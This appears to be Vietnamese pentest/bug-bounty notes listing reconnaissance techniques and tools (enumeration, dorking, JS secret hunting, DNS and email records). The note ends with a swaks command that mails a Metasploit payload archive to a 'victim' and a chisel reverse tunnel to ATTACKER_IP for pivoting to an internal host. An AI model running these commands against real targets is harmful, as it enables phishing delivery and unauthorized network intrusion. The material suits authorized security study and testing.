## Directory Enumeration
- Liệt kê các thư mục.
- Công cụ: dirsearch, fuff.
- Nên sử dụng wordlist dành riêng cho framework để có nhiều kết quả hơn.

## Technology Fingerprinting
- Kiểm tra các dịch vụ đang chạy trên ứng dụng. Thông thường, các máy chủ, thư viện và thành phần của bên thứ ba được sử dụng có thể đã lỗi thời và dễ gặp phải các sự cố bảo mật đã biết. 
- Công cụ: Wappalyzer Plugin, whatweb.

## Port Scanning
- Có thể thấy một số cổng đang chạy một số dịch vụ có thể đang sử dụng thông tin xác thực mặc định, bị định cấu hình sai hoặc dễ bị tấn công.
- Công cụ: nmap.

## Broken Link Hijacking
- Nếu ứng dụng có một số hồ sơ truyền thông xã hội, trang web được liên kết của bên thứ ba hoặc tham chiếu đến bất kỳ miền đã hết hạn nào – hãy thử thực hiện tiếp quản.
- Công cụ: Broken Link Hijacking Burp Plugin.
  
## JS Files for Hardcoded APIs & Secrets
- Các tệp JavaScript thường chứa thông tin thú vị. Đi sâu vào từng tệp JavaScript, bạn có thể nhận được nhiều thông tin hữu ích từ API được mã hóa cứng, bí mật (chẳng hạn như thông tin xác thực AWS), thông tin về nhóm S3, tên miền phụ khác, thông tin PII, endpoint, tham số thú vị, logic để vượt qua một số hạn chế nhất định như đối với XSS và Open Redirection, bạn có thể làm được rất nhiều thứ.
- Công cụ: SecretFinder, JFScan, LinkFinder, DetectDynamicJS(Burp Plugin), Retire.js (Burp Plugin/Browser Extension/Standalone), JS Link Finder (Burp Plugin).

## Parameter Discovery
- Khám phá các tham số có thể không hiển thị trực tiếp thông qua điều hướng ứng dụng nhưng vẫn được xử lý ở phía máy chủ. Các tham số này thường dễ bị tấn công như SSRF, Open Redirection, XSS, SQLi, IDOR, v.v.
- Công cụ: Arjun, ParamSpider, Param Miner.

## Wayback History
- Có thể tìm thấy các URL có thể không còn khả dụng thông qua quy trình làm việc của ứng dụng nhưng vẫn có thể truy cập được. Đôi khi, các trang nhạy cảm được lưu vào bộ nhớ đệm tiết lộ thông tin thú vị và bạn cũng có thể lấy một loạt điểm cuối để kiểm tra nhiều lỗ hổng khác nhau.
- Công cụ: Wayback Machine, waybackurls, gau.

## Domain-Specific GitHub & Google Dorking
- Tăng bề mặt tấn công bằng cách tìm ngày càng nhiều điểm cuối, dịch vụ bị lộ, v.v. Tuy nhiên, trong trường hợp điều chỉnh phạm vi nhỏ, bạn có thể kiểm tra mã thông báo xác thực, UUID, mã định danh người dùng/tài sản, tệp sao lưu , thông tin nhạy cảm được lưu trong bộ nhớ đệm bằng cách sử dụng Google Dorks & GitHub Dorking.
- GHDB, Interesting GitHub Dorks List, GitDorker, GitRob, GitHound.

## Data Breach Analysis
- Tìm thông tin xác thực, cơ sở dữ liệu và thông tin nhạy cảm khác của nhiều tổ chức khác nhau bị rò rỉ.
- Intelx, Hacking Forums, Darknet/Darkweb Analysis.

## Misconfigured Cloud Storage
- Các tổ chức đang chuyển sang cơ sở hạ tầng đám mây và sử dụng các tùy chọn lưu trữ đám mây như Nhóm AWS S3, Nhóm GCP, v.v. để lưu trữ tài sản của họ. Tuy nhiên, do cấu hình sai đơn giản, một tổ chức có thể rò rỉ/tiết lộ một loạt thông tin cho những kẻ tấn công. Luôn luôn liệt kê các nhóm và các dịch vụ dựa trên đám mây khác và tìm kiếm cấu hình sai trong đó.

```
•	A / AAAA: ánh xạ tên miền → địa chỉ IPv4/IPv6. giúp biết máy chủ công khai nhận traffic.
•	CNAME: bí danh (alias) — chỉ ra tên thực tế, có thể hé lộ dịch vụ hoặc CDN.
•	MX: mail exchanger — chỉ ra nhà cung cấp/địa điểm xử lý email.
•	TXT: chứa SPF, DKIM public keys, config khác; thường dùng cho xác thực email và metadata.
•	SPF / DKIM / DMARC (thường trong TXT): độ cứng của bảo mật email — cấu hình thiếu/chưa tốt là rủi ro cho phishing.
•	NS: name servers của zone — biết ai quản lý DNS (third-party DNS providers).
•	SOA: thông tin quản trị zone, serial, TTL — giúp đánh giá vận hành DNS.
•	SRV: chỉ dịch vụ (ví dụ LDAP, SIP) — hé lộ dịch vụ mạng.
•	PTR (reverse DNS): mapping IP → tên, hữu ích cho xác định host.
Mục tiêu: hiểu “cấu trúc” và “ai/ở đâu” vận hành hạ tầng DNS và email, để báo cáo rủi ro và khuyến nghị vá.

•	Thông tin WHOIS / registrar / ngày tạo/hết hạn — rủi ro quản trị (ví dụ domain sắp hết hạn, thông tin contact lộ).
•	Name server / DNS provider — xác định rủi ro bên thứ ba (DNS hijack, provider compromise).
•	Danh sách subdomain công khai (ghi chú: thu thập bằng phương pháp passive được ủy quyền) — xác định bề rộng bề mặt tấn công.
•	Các bản ghi email (MX, SPF, DKIM, DMARC) — mức độ bảo vệ email, khả năng spoofing/phishing.
•	Certificate Transparency / TLS certs — xem cert nào được phát hành cho domain/subdomain.
•	Public cloud / CDN / third-party services liên kết với domain — rủi ro do cấu hình sai (exposed storage buckets, misconfigured services).
•	Public code/repos, leak / paste sites — có secret, token hay cấu hình lộ không.
•	Web application fingerprint (stack, CMS, framework) — để báo cáo lỗ hổng liên quan đến các phiên bản dễ bị tấn công (nêu tên và khuyến nghị cập nhật).
•	Email infrastructure & forwarders — rủi ro cho phishing và data exfiltration.
•	DNS security settings: DNSSEC bật/tắt; zone transfer policy (nên chặn).
•	Expiration & renewal practices — domain expiration hijacking risk.



```
```
swaks --to victim@target.com --from attacker@fake.com --server localhost:25 --attach ~/.msf4/local/payload.tar --body "Test attachment" --header "Subject: Important File"

```
```
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
chmod +x chisel_1.9.1_linux_amd64
mv chisel_1.9.1_linux_amd64 chisel

https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.exe

./chisel server -p 443 --reverse

chisel.exe client ATTACKER_IP:443 R:2222:10.10.10.10:22


